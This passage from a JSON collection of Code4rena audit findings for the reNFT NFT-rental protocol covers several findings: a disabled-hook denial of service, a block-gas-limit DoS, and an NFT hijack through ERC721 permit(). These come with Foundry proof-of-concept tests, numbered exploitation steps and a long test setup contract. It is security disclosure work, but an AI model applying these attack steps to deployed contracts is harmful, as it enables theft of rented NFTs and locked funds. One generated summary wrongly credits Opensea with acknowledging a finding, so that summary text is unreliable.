Hook[] memory hooks = new Hook[](1);\n     hooks[0] = Hook({\n         target: address(hook),\n         itemIndex: 0,\n         extraData: abi.encode(bitmap)\n     });\n\n     // start the rental with hook.\n     RentalOrder memory rentalOrder = _startRentalWithGameToken(1, hooks);\n     bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);\n     assertEq(STORE.orders(rentalOrderHash), true);\n\n     // Admin disables the onStop hook\n     vm.prank(deployer.addr);\n     guard.updateHookStatus(address(hook), uint8(3));    // 011\n\n     // User tries to stop the rental\n     // But txn always reverts\n     vm.warp(block.timestamp + 500);\n     vm.prank(alice.addr);\n     vm.expectRevert(abi.encodeWithSelector(\n         Errors.Shared_DisabledHook.selector,\n         address(hook)\n     ));\n     stop.stopRent(rentalOrder);\n     assertEq(STORE.orders(rentalOrderHash), true);\n }\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nConsider rethinking about the need of `onStop` hook status because if `onStart` hook is executed for a rental then the `onStop` hook must also be executed irrespective of the hook status.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/501#issuecomment-1910706849)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/9) - `onStart` and `onStop` hook functions are now independent of one another and do not both need to be implemented at the same time.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/11) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/38).\n\n***\n\n",
      "summary": "\nThe `Guard::updateHookStatus` function is used by protocol administrators to manage the status of hooks, which are essential components that control transactions within the protocol. However, a vulnerability has been found where disabling the `onStop` hook can cause disruptions in the rental closing flow. This is because the hook address is provided by the lender and renter during rental creation and cannot be modified afterwards. If the `onStop` hook is disabled while the rental is active, the `stopRent` transaction will always fail. This bug has been confirmed and mitigated by the reNFT team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/501",
      "tags": [],
      "finders": [
        "3",
        "rokinot",
        "ZdravkoHr",
        "0xdice91",
        "kaden",
        "SBSecurity",
        "trachev",
        "juancito",
        "rbserver",
        "marqymarq10",
        "BI\\_security",
        "haxatron",
        "0xA5DF",
        "0xDING99YA",
        "AkshaySrivastav",
        "said",
        "imare",
        "serial-coder",
        "evmboi32",
        "oakcobalt",
        "1",
        "2",
        "Jorgect",
        "5",
        "rvierdiiev",
        "4"
      ]
    },
    {
      "id": "30530",
      "title": "[M-03] Risk of DoS when stoping large rental orders due to block gas limit",
      "impact": "MEDIUM",
      "content": "\nWhen an order is created on Opensea the `Create::validateOrder()` policy method is used to ensure the order is configured correctly. Currently there is no maximum limit to the number of `offers` in the input `ZoneParameters`, which allows orders to contain an arbitrary amount of ERC-721 and ERC-1155 items to a rental order.\n\nIf a large enough rental order is successfully created, there is a risk that it won't be able to be stopped by calling the `Stop::stopRent()` due to the amount of gas required exceeding the block gas limit. This would prevent the escrow from settling the order and leave the order permantanly in a rental state. This also means any ERC-721 and ERC-1155 tokens in the order would not be able to be reclaimed.\n\nThis situation arises under the following conditions:\n\n*   The call to stop a rental order uses more gas than the call to create a rental order\n*   The call to create the rental order is successful\n*   The call to stop a rental order uses more gas than the block gas limit\n\n### Proof of Concept\n\nBelow I have written 2 proof of concepts to show the above conditions are possible. Each of these can be added to `StopRent.t.sol` to run.\n\n<Details>\n\n```solidity\n    // Update the `setup` in AccountCreator to 2000+ tokens on deployToken\n    function testFuzz_StopRent_PayOrder_More_Expensive_To_Stop_Than_Start(uint numOf721, uint numof1155) public {\n        numOf721 = bound(numOf721, 400, erc721s.length);\n        numof1155 = bound(numof1155, 400, erc1155s.length);\n\n        uint numOfERC20 = erc1155s.length % 30;\n        // create a Alice BASE order\n        createOrder({\n            offerer: alice,\n            orderType: OrderType.BASE,\n            erc721Offers: numOf721,\n            erc1155Offers: numof1155,\n            erc20Offers: 0,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: numOfERC20\n        });\n\n        (\n            Order memory orderOne,\n            bytes32 orderHashOne,\n            OrderMetadata memory metadataOne\n        ) = finalizeOrder();\n\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: orderOne,\n            orderHash: orderHashOne,\n            metadata: metadataOne\n        });\n\n        uint initialGasLeft = gasleft();\n\n        // finalize the base order fulfillment\n        RentalOrder memory rentalOrderOne = finalizeBaseOrderFulfillment();\n        \n        uint totalGasForOrder = initialGasLeft - gasleft();\n\n        // speed up in time past the rental expiration\n        vm.warp(block.timestamp + 750);\n\n\n        // stop the rental order and steal carols nft\n        vm.prank(alice.addr);\n        uint remaininggInitial = gasleft();\n        stop.stopRent(rentalOrderOne);\n\n        uint finalGasLeft = gasleft();\n        uint gasForStopingRent = remaininggInitial - finalGasLeft;\n        \n        assert(totalGasForOrder > gasForStopingRent);\n    }\n\n    // Update the `setup` in AccountCreator to 2000+ tokens on deployToken\n    function testFuzz_StopRent_PayOrder_StopRent_Hit_Block_GasLimit(uint numOf721, uint numof1155) public {\n        numOf721 = bound(numOf721, 1500, erc721s.length);\n        numof1155 = bound(numof1155, 1500, erc1155s.length);\n\n        uint numOfERC20 = erc1155s.length % 30;\n        // create a Alice BASE order\n        createOrder({\n            offerer: alice,\n            orderType: OrderType.BASE,\n            erc721Offers: numOf721,\n            erc1155Offers: numof1155,\n            erc20Offers: 0,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: numOfERC20\n        });\n\n        (\n            Order memory orderOne,\n            bytes32 orderHashOne,\n            OrderMetadata memory metadataOne\n        ) = finalizeOrder();\n\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: orderOne,\n            orderHash: orderHashOne,\n            metadata: metadataOne\n        });\n\n        uint initialGasLeft = gasleft();\n\n        // finalize the base order fulfillment\n        RentalOrder memory rentalOrderOne = finalizeBaseOrderFulfillment();\n        \n        uint totalGasForOrder = initialGasLeft - gasleft();\n\n        // speed up in time past the rental expiration\n        vm.warp(block.timestamp + 750);\n\n\n        // stop the rental order and steal carols nft\n        vm.prank(alice.addr);\n        uint remaininggInitial = gasleft();\n        stop.stopRent(rentalOrderOne);\n\n        uint finalGasLeft = gasleft();\n        uint gasForStopingRent = remaininggInitial - finalGasLeft;\n\n        // finalize the order creation\n        // block gaslimit for ETH: https://ycharts.com/indicators/ethereum_average_gas_limit\n        uint GAS_LIMIT = 30000000 wei;\n        \n        assert(gasForStopingRent < GAS_LIMIT);\n    }\n\n```\n\n</details>\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nLimit the number of offers that an order can contain (to a value such as 500 or 1000) to ensure that stopping rentals doesn't exceed the blocks gas limit. One way to do this is to enforce a maximum number of `SpentItem[] offer` and fail to create the order if it is exceeded.\n\n**[Alec1017 (reNFT) acknowledged](https://github.com/code-423n4/2024-01-renft-findings/issues/538#issuecomment-1915640715)**\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/538)._\n\n***\n\n",
      "summary": "\nThe bug report discusses a problem with the `Create::validateOrder()` policy method on Opensea. Currently, there is no limit to the number of `offers` that can be included in an order, which could lead to a large rental order that cannot be stopped due to exceeding the block gas limit. This means that the order would be stuck in a rental state and the tokens included in the order could not be reclaimed. The report includes proof of concept code to demonstrate the issue and recommends limiting the number of offers in an order to prevent this problem. The bug was acknowledged by the Opensea team and a solution is being worked on.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/538",
      "tags": [
        "Gas Limit",
        "DOS"
      ],
      "finders": [
        "BARW",
        "plasmablocks",
        "0xabhay",
        "serial-coder",
        "hals"
      ]
    },
    {
      "id": "30529",
      "title": "[M-02] A malicious borrower can hijack any NFT with `permit()` function he rents.",
      "impact": "MEDIUM",
      "content": "\n### Pre-requisite knowledge & an overview of the features in question\n\n***\n\n1.  **ERC-4494: Permit for ERC-721 NFTs**: ERC721-Permit is very similar to ERC20-permit (EIP-2612). ERC721 Permit adds a new `permit()` function. It allows user can sign an ERC721 approve transaction off-chain producing a signature that anyone could use and submit to the permit function. When permit is executed, it will execute the approve function. This allows for meta-transaction support of ERC721 transfers, but it also simply gets rid of the annoyance of needing two transactions: `approve` and `transferFrom`. Additionally, ERC721-Permit, just like ERC20 permit, prevents misuse and replay attacks. A replay attack is when a valid signature is used several times or in places where it's not intended to be used in.\n\n    You can find an implementation of it here, by uniswap: <https://github.com/Uniswap/v3-periphery/blob/main/contracts/base/ERC721Permit.sol>\n\n***\n\n### The Vulnerability & Exploitation Steps\n\n***\n\nReNFT doesn't account for ERC721 implementing the `permit()` function, allowing a malicious borrower to hijack the token by producing a signature and feeding it to the `permit()` function requesting it to approve his address to transfer the token\n\n**Exploitation Steps**\n\n1.  The attacker rents the NFT token in his rental safe\n2.  The attacker creates a signature which he will need to feed to the `permit()` function. The signature is a signed data including info like: 1. the deadline (until when the signature would be valid), 2. the token ID he wants to approve his address to spend, 3. the spender, in this case it's the attacker's address (Look at the PoC to see how it's generated)\n3.  The attacker calls `permit()` funtion and gives it the signature along with the deadline, approved address and the spender.\n4.  The `permit()` function will reach out to the attacker's rental safe (since it is the owner of the token and since it's a smart contract verifying the signature (EIP-1271) ), asking it if the signature is valid\n5.  The rental safe will verify the signature and confirm that it's the attacker (owner of the safe) who signed the transaction\n6.  `permit()` will approve the attacker's address to spend the token on behalf of the attacker's safe (token is owned by the safe)\n7.  Attacker will then transfer the token out of his safe.\n\n***\n\n### Proof of concept\n\n***\n\nTo run the PoC, you'll need to do the following:\n\n1.  You'll need to add the following two files to the test/ folder:\n    1.  `SetupExploit.sol` -> Sets up everything from seaport, gnosis, reNFT contracts\n    2.  `Exploit.sol` -> The actual exploit PoC which relies on `SetupExploit.sol` as a base.\n2.  You'll need to run this command\n    `forge test --match-contract Exploit --match-test test_NFT_Permit_Exploit -vvv`\n\n*Note: All of my 7 PoCs throughout my reports include the `SetupExploit.sol`. Please do not rely on the previous `SetupExploit.sol` file if you already had one from another PoC run in the tests/ folder. In some PoCs, there are slight modifications done in that file to properly set up the test infrastructure needed for the exploit*\n\n**The files:**\n\n<details>\n<summary><b>SetupExploit.sol</b></summary>\n<br>\n\n    // SPDX-License-Identifier: BUSL-1.1\n    pragma solidity ^0.8.20;\n\n    import {\n        ConsiderationItem,\n        OfferItem,\n        OrderParameters,\n        OrderComponents,\n        Order,\n        AdvancedOrder,\n        ItemType,\n        ItemType as SeaportItemType,\n        CriteriaResolver,\n        OrderType as SeaportOrderType,\n        Fulfillment,\n        FulfillmentComponent\n    } from \"@seaport-types/lib/ConsiderationStructs.sol\";\n    import {\n        AdvancedOrderLib,\n        ConsiderationItemLib,\n        FulfillmentComponentLib,\n        FulfillmentLib,\n        OfferItemLib,\n        OrderComponentsLib,\n        OrderLib,\n        OrderParametersLib,\n        SeaportArrays,\n        ZoneParametersLib\n    } from \"@seaport-sol/SeaportSol.sol\";\n\n    import {\n        OrderMetadata,\n        OrderType,\n        OrderFulfillment,\n        RentPayload,\n        RentalOrder,\n        Item,\n        SettleTo,\n        ItemType as RentalItemType\n    } from \"@src/libraries/RentalStructs.sol\";\n\n    import {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n    import {OrderMetadata, OrderType, Hook} from \"@src/libraries/RentalStructs.sol\";\n    import {Vm} from \"@forge-std/Vm.sol\";\n    import {Test} from \"@forge-std/Test.sol\";\n    import {Assertions} from \"@test/utils/Assertions.sol\";\n    import {Constants} from \"@test/utils/Constants.sol\";\n    import {LibString} from \"@solady/utils/LibString.sol\";\n    import {SafeL2} from \"@safe-contracts/SafeL2.sol\";\n    import {Safe} from \"@safe-contracts/Safe.sol\";\n    // import {BaseExternal} from \"@test/fixtures/external/BaseExternal.sol\";\n    import {SafeProxyFactory} from \"@safe-contracts/proxies/SafeProxyFactory.sol\";\n    import {Create2Deployer} from \"@src/Create2Deployer.sol\";\n    import {Kernel, Actions} from \"@src/Kernel.sol\";\n    import {Storage} from \"@src/modules/Storage.sol\";\n    import {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\n    import {Create} from \"@src/policies/Create.sol\";\n    import {Stop} from \"@src/policies/Stop.sol\";\n    import {Factory} from \"@src/policies/Factory.sol\";\n    import {Admin} from \"@src/policies/Admin.sol\";\n    import {Guard} from \"@src/policies/Guard.sol\";\n    import {toRole} from \"@src/libraries/KernelUtils.sol\";\n    import {Proxy} from \"@src/proxy/Proxy.sol\";\n    import {Events} from \"@src/libraries/Events.sol\";\n    import {HandlerContext} from \"@safe-contracts/handler/HandlerContext.sol\";\n    import {CompatibilityFallbackHandler} from \"@safe-contracts/handler/CompatibilityFallbackHandler.sol\";\n\n    import {ISignatureValidator} from \"@safe-contracts/interfaces/ISignatureValidator.sol\";\n\n    import {ProtocolAccount} from \"@test/utils/Types.sol\";\n    import {MockERC20} from \"@test/mocks/tokens/standard/MockERC20.sol\";\n    import {MockERC721} from \"@test/mocks/tokens/standard/MockERC721.sol\";\n    import {MockERC1155} from \"@test/mocks/tokens/standard/MockERC1155.sol\";\n    import {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\n    import {Enum} from \"@safe-contracts/common/Enum.sol\";\n    import {ISafe} from \"@src/interfaces/ISafe.sol\";\n\n    import {Seaport} from \"@seaport-core/Seaport.sol\";\n    import {ConduitController} from \"@seaport-core/conduit/ConduitController.sol\";\n    import {ConduitControllerInterface} from \"@seaport-types/interfaces/ConduitControllerInterface.sol\";\n    import {ConduitInterface} from \"@seaport-types/interfaces/ConduitInterface.sol\";\n\n    import \"@forge-std/console.sol\";\n\n\n\n    // Deploys all Seaport protocol contracts\n    contract External_Seaport is Test {\n        // seaport protocol contracts\n        Seaport public seaport;\n        ConduitController public conduitController;\n        ConduitInterface public conduit;\n\n        // conduit owner and key\n        Vm.Wallet public conduitOwner;\n        bytes32 public conduitKey;\n\n        function setUp() public virtual {\n            // generate conduit owner wallet\n            conduitOwner = vm.createWallet(\"conduitOwner\");\n\n            // deploy conduit controller\n            conduitController = new ConduitController();\n\n            // deploy seaport\n            seaport = new Seaport(address(conduitController));\n\n            // create a conduit key (first 20 bytes must be conduit creator)\n            conduitKey = bytes32(uint256(uint160(conduitOwner.addr))) << 96;\n\n            // create a new conduit\n            vm.prank(conduitOwner.addr);\n            address conduitAddress = conduitController.createConduit(\n                conduitKey,\n                conduitOwner.addr\n            );\n\n            // set the conduit address\n            conduit = ConduitInterface(conduitAddress);\n\n            // open a channel for seaport on the conduit\n            vm.prank(conduitOwner.addr);\n            conduitController.updateChannel(address(conduit), address(seaport), true);\n\n            // label the contracts\n            vm.label(address(seaport), \"Seaport\");\n            vm.label(address(conduitController), \"ConduitController\");\n            vm.label(address(conduit), \"Conduit\");\n        }\n    }\n\n    // Deploys the Create2Deployer contract\n    contract External_Create2Deployer is Test {\n        Create2Deployer public create2Deployer;\n\n        function setUp() public virtual {\n            // Deploy the create2 deployer contract\n            create2Deployer = new Create2Deployer();\n\n            // label the contract\n            vm.label(address(create2Deployer), \"Create2Deployer\");\n        }\n    }\n\n    // Deploys all Gnosis Safe protocol contracts\n    contract External_Safe is Test {\n        SafeL2 public safeSingleton;\n        SafeProxyFactory public safeProxyFactory;\n\n        CompatibilityFallbackHandler public fallbackHandler;\n\n        function setUp() public virtual {\n            // Deploy safe singleton contract\n            safeSingleton = new SafeL2();\n\n            // Deploy safe proxy factory\n            safeProxyFactory = new SafeProxyFactory();\n\n            // Deploy the compatibility token handler\n            fallbackHandler = new CompatibilityFallbackHandler();\n\n            // Label the contracts\n            vm.label(address(safeSingleton), \"SafeSingleton\");\n            vm.label(address(safeProxyFactory), \"SafeProxyFactory\");\n            vm.label(address(fallbackHandler), \"TokenCallbackHandler\");\n        }\n    }\n\n    contract BaseExternal is External_Create2Deployer, External_Seaport, External_Safe {\n        // This is an explicit entrypoint for all external contracts that the V3 protocol depends on.\n        //\n        // It contains logic for:\n        // - setup of the Create2Deployer contract\n        // - setup of all Seaport protocol contracts\n        // - setup of all Gnosis Safe protocol contracts\n        //\n        // The inheritance chain is as follows:\n        // External_Create2Deployer + External_Seaport + External_Safe\n        // --> BaseExternal\n\n        function setUp()\n            public\n            virtual\n            override(External_Create2Deployer, External_Seaport, External_Safe)\n        {\n            // set up dependencies\n            External_Create2Deployer.setUp();\n            External_Seaport.setUp();\n            External_Safe.setUp();\n        }\n    }\n\n    // Deploys all V3 protocol contracts\n    contract Protocol is BaseExternal {\n        // Kernel\n        Kernel public kernel;\n\n        // Modules\n        Storage public STORE;\n        PaymentEscrow public ESCRW;\n\n        // Module implementation addresses\n        Storage public storageImplementation;\n        PaymentEscrow public paymentEscrowImplementation;\n\n        // Policies\n        Create public create;\n        Stop public stop;\n        Factory public factory;\n        Admin public admin;\n        Guard public guard;\n\n        // Protocol accounts\n        Vm.Wallet public rentalSigner;\n        Vm.Wallet public deployer;\n\n        // protocol constants\n        bytes12 public protocolVersion;\n        bytes32 public salt;\n\n        function _deployKernel() internal {\n            // abi encode the kernel bytecode and constructor arguments\n            bytes memory kernelInitCode = abi.encodePacked(\n                type(Kernel).creationCode,\n                abi.encode(deployer.addr, deployer.addr)\n            );\n\n            // Deploy kernel contract\n            vm.prank(deployer.addr);\n            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));\n\n            // label the contract\n            vm.label(address(kernel), \"kernel\");\n        }\n\n        function _deployStorageModule() internal {\n            // abi encode the storage bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory storageImplementationInitCode = abi.encodePacked(\n                type(Storage).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy storage implementation contract\n            vm.prank(deployer.addr);\n            storageImplementation = Storage(\n                create2Deployer.deploy(salt, storageImplementationInitCode)\n            );\n\n            // abi encode the storage bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory storageProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(storageImplementation),\n                    abi.encodeWithSelector(\n                        Storage.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy storage proxy contract\n            vm.prank(deployer.addr);\n            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));\n\n            // label the contracts\n            vm.label(address(STORE), \"STORE\");\n            vm.label(address(storageImplementation), \"STORE_IMPLEMENTATION\");\n        }\n\n        function _deployPaymentEscrowModule() internal {\n            // abi encode the payment escrow bytecode and constructor arguments\n            // for the implementation contract\n            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(\n                type(PaymentEscrow).creationCode,\n                abi.encode(address(0))\n            );\n\n            // Deploy payment escrow implementation contract\n            vm.prank(deployer.addr);\n            paymentEscrowImplementation = PaymentEscrow(\n                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)\n            );\n\n            // abi encode the payment escrow bytecode and initialization arguments\n            // for the proxy contract\n            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n                type(Proxy).creationCode,\n                abi.encode(\n                    address(paymentEscrowImplementation),\n                    abi.encodeWithSelector(\n                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                        address(kernel)\n                    )\n                )\n            );\n\n            // Deploy payment escrow contract\n            vm.prank(deployer.addr);\n            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n            // label the contracts\n            vm.label(address(ESCRW), \"ESCRW\");\n            vm.label(address(paymentEscrowImplementation), \"ESCRW_IMPLEMENTATION\");\n        }\n\n        function _deployCreatePolicy() internal {\n            // abi encode the create policy bytecode and constructor arguments\n            bytes memory createInitCode = abi.encodePacked(\n                type(Create).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy create rental policy contract\n            vm.prank(deployer.addr);\n            create = Create(create2Deployer.deploy(salt, createInitCode));\n\n            // label the contract\n            vm.label(address(create), \"CreatePolicy\");\n        }\n\n        function _deployStopPolicy() internal {\n            // abi encode the stop policy bytecode and constructor arguments\n            bytes memory stopInitCode = abi.encodePacked(\n                type(Stop).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy stop rental policy contract\n            vm.prank(deployer.addr);\n            stop = Stop(create2Deployer.deploy(salt, stopInitCode));\n\n            // label the contract\n            vm.label(address(stop), \"StopPolicy\");\n        }\n\n        function _deployAdminPolicy() internal {\n            // abi encode the admin policy bytecode and constructor arguments\n            bytes memory adminInitCode = abi.encodePacked(\n                type(Admin).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy admin policy contract\n            vm.prank(deployer.addr);\n            admin = Admin(create2Deployer.deploy(salt, adminInitCode));\n\n            // label the contract\n            vm.label(address(admin), \"AdminPolicy\");\n        }\n\n        function _deployGuardPolicy() internal {\n            // abi encode the guard policy bytecode and constructor arguments\n            bytes memory guardInitCode = abi.encodePacked(\n                type(Guard).creationCode,\n                abi.encode(address(kernel))\n            );\n\n            // Deploy guard policy contract\n            vm.prank(deployer.addr);\n            guard = Guard(create2Deployer.deploy(salt, guardInitCode));\n\n            // label the contract\n            vm.label(address(guard), \"GuardPolicy\");\n        }\n\n        function _deployFactoryPolicy() internal {\n            // abi encode the factory policy bytecode and constructor arguments\n            bytes memory factoryInitCode = abi.encodePacked(\n                type(Factory).creationCode,\n                abi.encode(\n                    address(kernel),\n                    address(stop),\n                    address(guard),\n                    address(fallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe = factory.deployRentalSafe(owners, 1);\n\n\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n          